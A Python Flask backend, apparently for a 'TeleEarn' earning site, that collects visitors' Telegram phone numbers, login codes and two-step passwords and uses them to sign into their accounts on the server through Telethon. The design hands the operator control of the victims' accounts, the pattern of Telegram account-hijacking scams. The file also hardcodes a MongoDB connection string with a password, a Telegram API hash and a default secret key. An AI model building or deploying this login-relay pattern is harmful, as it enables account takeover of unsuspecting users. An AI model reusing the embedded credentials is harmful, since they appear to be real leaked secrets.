import os
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient # .sync যোগ করা হয়েছে
from telethon.sessions import StringSession
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")

# CORS সেটিংস
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# আপনার কনফিগারেশন
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# ডাটাবেস
client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn']
users_col = db['users']

# টেম্পোরারি ক্লায়েন্ট স্টোর
temp_clients = {}

@app.route('/')
@app.route('/login')
def login(): return render_template('login.html')

# ---------------- ওটিপি পাঠানোর ফাংশন (SYNC) ----------------

@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"success": False, "message": "Phone number missing"})

    try:
        # Sync পদ্ধতিতে কানেক্ট করা
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        
        # ওটিপি রিকোয়েস্ট
        result = client.send_code_request(phone)
        
        temp_clients[phone] = {
            "client": client,
            "hash": result.phone_code_hash
        }
        
        return jsonify({"success": True, "message": "OTP Sent Successfully!"})
        
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# ---------------- ভেরিফাই এবং লগইন (SYNC) ----------------

@app.route('/api/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    two_step = data.get('password')

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "Session expired"})

    try:
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        
        # সাইন ইন
        user = client.sign_in(phone, code, phone_code_hash=h, password=two_step)
        
        user_data = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "joined": datetime.utcnow()
        }
        
        users_col.update_one(
            {"telegram_id": user.id},
            {"$set": user_data, "$setOnInsert": {"main_balance": 0}},
            upsert=True
        )
        
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id})
        
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# অন্য সব রাউটস
@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/admin')
def admin_page(): return render_template('admin.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
